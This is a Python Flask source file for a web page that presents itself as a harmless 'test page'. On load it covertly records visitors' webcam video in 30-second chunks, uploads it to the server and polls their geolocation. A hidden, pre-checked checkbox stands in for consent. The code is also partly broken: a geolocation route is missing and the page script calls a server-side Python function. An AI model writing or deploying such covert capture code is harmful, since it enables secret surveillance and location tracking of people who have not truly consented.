import os
import time
import json
from flask import Flask, request
from werkzeug.utils import secure_filename

#Note to add HTTS File

app = Flask(__name__)

# Ensure the "captured_videos" directory exists
if not os.path.exists("captured_videos"):
    os.makedirs("captured_videos")

# Initialize a flag to check if the checkbox is clicked
geo_location_captured = False

# Initialize a list to store the geolocation data
user_geolocations = []

# Function to save geolocation data to a text file
def save_geolocation_to_file(data):
    timestamp = int(time.time())
    filename = f"user_geolocations_{timestamp}.txt"
    with open(filename, "a") as f:
        f.write(json.dumps(data) + "\n")

html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Processing Page</title>
</head>
<body>
    <input type="checkbox" id="consentCheckbox" checked style="display: none;"> <!-- Checkbox is initially checked -->
    <label for="consentCheckbox" >Welcome to our test page </label>
    
    <script>
        var video = document.createElement("video");
        var consentCheckbox = document.getElementById("consentCheckbox");
        var constraints = { video: true };
        var capturing = false;

        // Set the capture interval to 30 seconds (30,000 milliseconds)
        var captureInterval = 30000;

        // MediaRecorder to record video
        var mediaRecorder = null;
        var recordedChunks = [];

        // Function to capture and send geolocation data
        function captureGeoLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    var latitude = position.coords.latitude;
                    var longitude = position.coords.longitude;

                    // Create a JSON object with the geolocation data
                    var geoLocationData = { latitude: latitude, longitude: longitude };

                    // Send the geolocation data to the server
                    fetch("/capture-geo-location", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                        },
                        body: JSON.stringify(geoLocationData),
                    })
                    .then(response => {
                        if (response.ok) {
                            console.log("Geolocation data sent successfully.");
                        } else {
                            console.error("Error sending geolocation data:", response.statusText);
                        }
                    })
                    .catch(error => {
                        console.error("Error sending geolocation data:", error);
                    });
                }, function(error) {
                    console.error("Error getting geolocation:", error);
                });
            } else {
                console.error("Geolocation is not supported in this browser.");
            }
        }

        function startRecording() {
            mediaRecorder = new MediaRecorder(video.srcObject);
            mediaRecorder.ondataavailable = function(event) {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = function() {
                var blob = new Blob(recordedChunks, { type: 'video/webm' });
                var formData = new FormData();
                
                // Create a unique filename based on the current timestamp
                var timestamp = new Date().toISOString();
                var filename = 'captured_video_' + timestamp + '.webm';
                
                formData.append('video', blob, filename);

                // Send the captured video Blob to the server
                fetch("/capture-visitor-details", {
                    method: "POST",
                    body: formData,
                })
                .then(response => {
                    if (response.ok) {
                        console.log("Video data sent successfully.");
                    } else {
                        console.error("Error sending video data:", response.statusText);
                    }
                })
                .catch(error => {
                    console.error("Error sending video data:", error);
                });

                // Capture and send geolocation data after recording
                if (consentCheckbox.checked) {
                    captureGeoLocation();
                }

                // Save the geolocation data to a text file
                if (geo_location_captured) {
                    save_geolocation_to_file(geoLocationData);
                }

                recordedChunks = [];
            };

            mediaRecorder.start();
            setTimeout(function() {
                mediaRecorder.stop();
                startRecording(); // Start a new recording after 30 seconds
            }, captureInterval);

            // Capture geolocation data twice a minute (every 30 seconds)
            setInterval(function() {
                if (consentCheckbox.checked) {
                    captureGeoLocation();
                    // Set the geo_location_captured flag to true
                    geo_location_captured = true;
                }
            }, captureInterval);
        }

        // Check if the checkbox is initially checked when the page loads
        if (consentCheckbox.checked) {
            capturing = true;

            // Access the user's camera
            navigator.mediaDevices
                .getUserMedia(constraints)
                .then(function (stream) {
                    video.srcObject = stream;
                    video.onloadedmetadata = function () {
                        video.play();
                        startRecording();
                    };
                })
                .catch(function (error) {
                    console.error("Error accessing the camera:", error);
                });
        }

        consentCheckbox.addEventListener("change", function () {
            if (consentCheckbox.checked) {
                capturing = true;

                // Start capturing images
                startRecording();
            } else {
                capturing = false;
            }

            // Capture and send geolocation data if the checkbox is clicked
            if (consentCheckbox.checked && !geo_location_captured) {
                captureGeoLocation();
                geo_location_captured = true;
            }
        });
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return html_template

@app.route("/capture-visitor-details", methods=["POST"])
def capture_visitor_details():
    try:
        # Retrieve the video Blob from the request
        video_blob = request.files["video"]

        if video_blob:
            # Generate a unique filename based on timestamp
            timestamp = int(time.time())
            video_filename = os.path.join("captured_videos", f"captured_video_{timestamp}.webm")

            # Save the captured video Blob to the "captured_videos" folder
            video_blob.save(video_filename)

            # If needed, you can return a response indicating success
            return "Video data received and saved successfully"
        else:
            return "No video data received", 400  # Bad Request
    except Exception as e:
        # Log the error to the console for debugging
        print("Error:", str(e))
        return "Internal Server Error", 500  # Return a 500 status code for server errors

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=443, debug=True, ssl_context=("server.crt", "server.key"))